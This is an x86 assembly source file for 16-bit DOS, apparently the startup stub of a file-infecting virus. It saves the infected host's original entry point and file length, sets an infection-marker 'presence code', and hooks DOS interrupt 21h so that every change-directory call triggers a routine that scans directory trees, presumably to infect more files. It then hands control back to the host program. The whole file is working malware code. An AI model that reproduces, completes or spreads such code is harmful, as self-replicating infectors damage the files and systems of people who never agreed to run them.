
	;c0v.asm startup code
.286

push_all macro
push ds
push es
pushf
pusha
endm

pop_all macro
popa
popf
pop es
pop ds
endm

 PASSWORD = 17	;	Presence code
 STACKTOP equ 2048 + offset DGROUP:edata@; To initialize SP register

 _TEXT SEGMENT BYTE PUBLIC 'CODE'
 _TEXT ENDS
 _DATA SEGMENT PARA PUBLIC 'DATA'
 _DATA ENDS
  DGROUP GROUP _TEXT,_DATA,_BSS,_BSSEND
 _BSS segment word public 'BSS'
 _BSS ends
 _BSSEND segment byte public 'STACK'
 _BSSEND ends
 ASSUME CS:_TEXT,DS:DGROUP

 _TEXT SEGMENT
			;Do not move _exit!
 public _exit;
 _exit:
 mov ax,4c00h
 int 21h

public _OEP
_OEP 		dd 0
public _OldFileLength
_OldFileLength	dd 0
public _OldEntryPoint
_OldEntryPoint label dword	;    Global data
OldExeIP 	dw offset _exit
OldReloCS	dw 0
public	_NRCS
_NRCS		dw 0
public _NewReloCS
_NewReloCS	dw 0

OldSP	dw 0			;To save stack SS:SP
OldSS	dw 0



public _presence
_presence dw PASSWORD

public _counter
_counter dw 17

extrn _vmain: near
extrn _scantree: near

 public _startx
 _startx:

 push_all;
 cli
 mov ax, ds
 mov cs:_psp, ax	; set _psp global variable
 mov ax,ss
 mov cs:OldSS,ax
 mov cs:OldSP,sp
 push cs		;Initialize registers
 pop ds
 push cs
 pop es
 push cs
 pop ss			;	ATTENTION!
 mov sp,STACKTOP	;	SS:SP itialization

 call _vmain		; 	void vmain(void);

 mov  ax,cs
 sub ax,_NewReloCS
 add OldReloCS,ax
 cli
 mov ax,OldSS
 mov ss,ax		;	ATTENTION!
 mov sp,OldSP		;stack re-init
 pop_all		;
 jmp dword ptr cs:_OldEntryPoint;

 _psp dw 0
 public _psp

 _err_handler:
 public _err_handler
 mov al,3
 iret

 _Old21Handler dd 0;
 public _Old21Handler

 _Int21handler:
 public _Int21handler
 pushf
 cmp ah,3Bh 	; ChDir?
 je Yes	       	; Yes.

 popf		; No.
 jmp dword ptr cs:_Old21Handler

 Yes:
 popf
 push_all;
 cli
 mov ax,ss
 mov cs:OldSS,ax
 mov cs:OldSP,sp
 push cs		;Initialize registers
 pop ds
 push cs
 pop es
 push cs
 pop ss			;	ATTENTION!
 mov sp,STACKTOP	;	SS:SP itialization

 call _scantree		; 	void vmain(void);

 cli
 mov ax,OldSS
 mov ss,ax		;	ATTENTION!
 mov sp,OldSP		;stack re-init
 pop_all		;
 jmp dword ptr cs:_Old21Handler;



 _TEXT ENDS

 _BSS SEGMENT
 public edata@
 edata@ label byte
 public _end_of_program
 _end_of_program label word	;
 _BSS ENDS

 end _startx